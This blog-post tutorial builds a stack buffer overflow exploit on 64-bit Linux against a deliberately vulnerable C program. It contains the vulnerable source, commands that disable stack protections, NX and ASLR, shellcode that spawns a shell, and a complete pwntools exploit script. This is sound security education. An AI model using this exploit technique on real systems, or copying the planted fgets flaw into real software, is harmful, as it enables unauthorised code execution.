---
layout: post
title:  "Taking Over Programs With Buffer Overflows"
date:   2016-10-11 10:53:00 -0400
categories: update post exploitation
---

<h2>Introduction</h2>

Inspired largely by my time reading "Hacking: The Art of Exploitation" during the past summer, this post tutorializes basic buffer overflow exploits on Linux machines. A buffer overflow occurs when a memory array (a buffer) is written through and past its intended bounds, corrupting nearby data in higher memory space. A program vulnerable to a buffer overflow exploit is able to be controlled by attackers in such a way that the programmer is no longer the one who decides what the computer will do. On modern operating systems protections are in place to inhibit attackers from exploiting programs that can use them, but we'll cheat a bit by removing them, because showing how to bypass them would cause this tutorial to be too long.

An understanding of the basics of C programming and familiarity with some scripting language is preferred to take away most of the understanding from this post, but a familiarity with x86 assembly make the rest of it less arcane. Other tools I'll be using will include:

- GDB, for debugging & disassembly
- Python w/pwntools, for scripting input

If you want to use other tools, you could use radare2, BinaryNinja, or IDA as easily as objdump and GDB, and Ruby/Perl/Bash as well as you could use Python.

<h2>Preparation</h2>

We have this source.

{%highlight C %}
//Filename: overflow_vuln.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char* secret = "secretwordsyoucantsee";
const char* access_cmd = "/bin/sh";
const int DATA_SIZE = 64;

int main(){
	
	char buffer[24];
	printf("Password:");
	fgets(buffer, DATA_SIZE, stdin); //vulnerability placed here
	printf("\nYou printed %s\n", buffer);

	if(strcmp(buffer,secret) == 0){
		printf("Access granted.\n");
		system("/bin/sh");
	} else {
		printf("Permission denied.\n");
	}
	
}

{% endhighlight %}

The improper checking of data passed into memory altering functions isn't uncommon in programs that end up vulnerable to these kinds of attacks. Quite often there's a way to trick program logic into changing variable sizes, but I decided to keep this straightforward and place the vulnerability on the third line within the main function. By passing in too large of a size into fgets, the function will expect our buffer to be larger than it actually is, and begin to overwrite data higher up on our stack.

Before we dig further though, let's compile our program and remove the protection of the operating system from our unsafe program. 

{% highlight BASH %}
	   #!/bin/bash
	   
	   #compile source
	   gcc -o overflow_vuln overflow_vuln.c -fno-stack-protector
	   
	   #disable NX protection, allowing us to execute data as code on the stack later
	   execstack -s ./overflow_vuln
	   
	   #disable ASLR, allowing us to expect consistent memory locations
	   echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
{% endhighlight %}

<h1>Insepction</h1>

Now let's launch gdb to see the disassembly of our program. We can do this by entering in these three lines in our terminal with GDB installed.

	gdb -q ./overflow_vuln
	set disassembly-flavor intel
	disass main

The -q flag in our first line simply cuts out a lot of extraneous information GDB gives, while passing in our program for debugging. The second line sets the assembly syntax to intel, just because I find it easier to read. And lastly, the third line produces the code the our main function was compiled into. Take a fair time glancing up and down it, but pay especial attention to the top, and the bottom lines of it.

	Dump of assembler code for function main:
	0x0000000000400686 <+0>:	push   rbp		#saves the base of the frame below main() stack frame
	0x0000000000400687 <+1>:	mov    rbp,rsp 	#fills RBP with the value at top of old stack frame
	0x000000000040068a <+4>:	sub    rsp,0x20 #opens up new stack frame with enough space for buffer
	...
	0x000000000040070c <+134>:	leave  
	0x000000000040070d <+135>:	ret    
	End of assembler dump.
	
In x86 assembly, push, leave, and ret are instructions that alter the stack through the base pointer and stack pointer registers (RBP and RSP respectively). The registers are special locations of memory that hold pointers to the base and the top of our stack. The push instruction pushes the value of a register (RBP here) onto the stack and opens the RSP by 4 bytes. It's use here is to save the address of the base function system function calling our main(). The way functions are called in x86 would have the return address into that same function in place right above this, and our goal here is to write past the base pointer in such a way that it points to somewhere else, to code that we want the program to execute.

When the leave instruction is executed, it collapses the stack frame and pops the base address stored underneath it back into RBP. Then, lastly, the ret instruction will pop the address underneath our main() frame off the stack to redirect the flow of our program. 

Where the sub instruction opens up the stack by 0x20 (32) bytes, that tells us we need to write past this, plus the base pointer address (where pointers are 8 bytes on a 64 bit machine). So after 40 bytes we can begin to write into the space of our return address. So our payload will look like...

	'A' * 40 | RET address | 0x10 (newline)

With this possible, we can point to any instructions anywhere within the process space, even instructions we place inside it ourselves. Two common options in doing this are by placing this within the buffer we send the payload in or in an environment variable that'll sit on the stack. I'll go with the latter, with some machine code that will give back a shell on our terminal. 

It is here, at getting shellcode, where I'm probably weakest, because I'm much more capable of reading competently crafted assembly than I am in writing it. So, like the skid I am, and <a href="https://systemoverlord.com/2014/06/05/minimal-x86-64-shellcode-for-binsh/">with proper attribution towards security engineer David Tomaschik I'm stealing some</a>, with some slight modification for ease in exploitation.

{% highlight Assembly %}
	BITS 64
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	xor rax, rax
	add rax, 59
	xor rdi, rdi
	push rdi
	mov rdi, 0x68732F2f6e69622F
	push rdi
	lea rdi, [rsp]
	xor rsi, rsi
	xor rdx, rdx
	syscall
 
{% endhighlight %}

What this assembly does when run is launch the sh shell. The nop instruction is a kind of non-instruction that just passes the program counter onward to the next space. Having a sled of these helps out a bit when you can't predict very easily where your pointer will land. Of course, you can use any shellcode you like, and you would probably learn most from compiling your own. To compile, try the following with nasm installed and in your path:

{% highlight BASH %}

	nasm shellcode.s -o shellcode

{% endhighlight %}

You can then place your shellcode in an environment variable like so:

{% highlight BASH %}

	export SHELLCODE=$(cat shellcode)
	
{% endhighlight %}

But at this point, I decided to start building a script to do this automatically with Python. To find where an environment variable should be within our program, we can write another program utilizing the standard C library system call getenv(), and compile the program into a binary whose filename is off the same length (it to appears on the stack, higher than the variable we set).

{% highlight C%}
#include <stdio.h>
#include <stdlib.h>

int main(){
	printf("SHELLCODE = %p\n", getenv("SHELLCODE"));
}

{% endhighlight %}

With Python then, I placed the shellcode within the software environment, built the payload, and fed it into a newly launched vulnerable process to spawn my shell. I used the pwntools library to speed this up a fair bit, because on my system if I were to use Bash redirects it's difficult to remember how to pipe files and redirect the stdin back to my input before an end-of-file signal is sent (I'd pop my shell, but have no way to enjoy it). And so, my script follows as such:

{% highlight Python %}

from pwn import *

#place our shellcode into our environment
shellcode = file("shellcode").read()
print "Shellcode: " + shellcode

#place the gathered shellcode into our environment
os.environ['SHELLCODE'] = shellcode

#acquire the address of it from a similar stack
p = process("./env_show__me_") #name of equal length to our vulnerable program
print p.recvuntil("SHELLCODE = ")
shellcode_addr = int(p.recvline()[:-1], 16)
log.info( hex(shellcode_addr) )

#Begin to build our payload
f = file("payload", "w")

#Fill it with a bunch of junk
f.write("A"*40)

#get our address into our file in the little-endian format
s = p64(shellcode_addr + 15)

#writes out our payload to a file
f.write(s)
f.write(chr(0x10)) #fgets continues to read until it finds a newline
f.close() #Stay neat.

#Launch our vulnerable process
p = process("./overflow_vuln")

#reopen our payload file in read mode and gather it
payload = file("payload", "r").read()
log.info("Payload: " + payload)

#feed our payload into the program
p.sendline(payload)

#Enjoy our new shell
p.interactive()

{% endhighlight %}

<h2>Demo</h2>

When run, I have it.

<img src="/pics/buffer-overflow-demo.png">

<h2>Epilogue</h2>

Learning the basics of exploiting buffer overflows on an old 32-bit machine can be simpler when it comes to getting around operating system protections, but if you only have a 64-bit machine don't want to learn through a VM, it's most definitely possible. To get around the system protections disabled in this tutorial, I'd suggest looking into Return Oriented Programming, for which there are a number of good resources out there.
